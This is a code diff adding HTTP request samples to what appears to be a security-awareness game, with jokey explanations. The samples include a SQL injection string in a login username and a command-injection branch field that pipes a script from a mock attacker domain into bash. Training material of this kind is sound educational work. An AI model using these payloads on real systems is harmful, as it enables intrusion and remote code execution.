@@ -231,6 +231,40 @@ const REQUEST_POOL = [
     explanation: 'Legitimate session cleanup from cache service.',
     spotDescription: 'Internal cache maintenance operation, nothing suspicious.'
   },
+  {
+    isMalicious: false,
+    category: 'clean',
+    request: {
+      timestamp: '2026-04-30 03:33:00 UTC',
+      srcIp: '10.24.156.99',
+      dest: 'internal.veridian.corp',
+      method: 'POST',
+      path: '/api/v1/snacks/vending-machine',
+      host: 'facilities.veridian.corp',
+      userAgent: 'VendingOS/3.0 (Snacktron)',
+      headers: { 'Content-Type': 'application/json', 'X-Machine-ID': 'VM-42-LOBBY' },
+      body: JSON.stringify({ item: 'Flamin Hot Cheetos', quantity: 1, payment: 'payroll-deduction' }, null, 2)
+    },
+    explanation: 'Legitimate vending machine API call. Dave from Engineering is stress-eating again.',
+    spotDescription: 'Standard vending machine telemetry. The snack is suspicious. The request is not.'
+  },
+  {
+    isMalicious: false,
+    category: 'clean',
+    request: {
+      timestamp: '2026-04-30 04:02:58 UTC',
+      srcIp: '10.0.15.201',
+      dest: 'api.veridian.corp',
+      method: 'GET',
+      path: '/api/v1/employees/7824/is-it-friday',
+      host: 'api.veridian.corp',
+      userAgent: 'Mozilla/5.0 (Friday-Checker/1.0)',
+      headers: { 'Authorization': 'Bearer eyJhbG...' },
+      body: null
+    },
+    explanation: 'Legitimate authenticated API call to check if it is Friday. It is not. This is a sadder story than any of the attacks.',
+    spotDescription: 'Valid auth token, internal IP, reasonable endpoint for a company that apparently built a Friday-checker. Clean.'
+  },
 
   // === MALICIOUS REQUESTS (60%) ===
 
@@ -733,6 +767,42 @@ const REQUEST_POOL = [
     },
     explanation: 'PHP object injection attempt. The serialized string contains a stdClass with a "cmd" property, potentially leading to RCE.',
     spotDescription: 'Serialized PHP objects with property names like "cmd" and "out" in JSON context suggest insecure deserialization exploitation.'
+  },
+  {
+    isMalicious: true,
+    category: 'SQL Injection',
+    damage: 20,
+    request: {
+      timestamp: '2026-04-30 03:35:22 UTC',
+      srcIp: '198.51.100.77',
+      dest: 'api.veridian.corp',
+      method: 'POST',
+      path: '/api/v2/users/auth',
+      host: 'api.veridian.corp',
+      userAgent: 'Mozilla/5.0 (definitely a human, not a bot)',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username: "' OR '1'='1", password: 'hunter2' }, null, 2)
+    },
+    explanation: "SQL injection via username. The attacker used 'hunter2' as the password, which tells you everything about their threat level.",
+    spotDescription: "The username contains quotes and SQL operators. Also, 'hunter2' has been a joke password since 2002. Block this for their own dignity."
+  },
+  {
+    isMalicious: true,
+    category: 'Command Injection',
+    damage: 28,
+    request: {
+      timestamp: '2026-04-30 03:40:11 UTC',
+      srcIp: '185.234.72.19',
+      dest: 'build.veridian.corp',
+      method: 'POST',
+      path: '/api/build/trigger',
+      host: 'build.veridian.corp',
+      userAgent: 'curl/8.1.2',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ repo: 'frontend', branch: 'main; curl http://totally-not-malware.ru/shell.sh | bash' }, null, 2)
+    },
+    explanation: "Command injection disguised as a build trigger. The attacker named their C2 server 'totally-not-malware.ru', which is either extremely confident or extremely stupid.",
+    spotDescription: "The branch field contains a semicolon followed by a curl pipe to bash. The domain name is also a confession."
   }
 ];
 
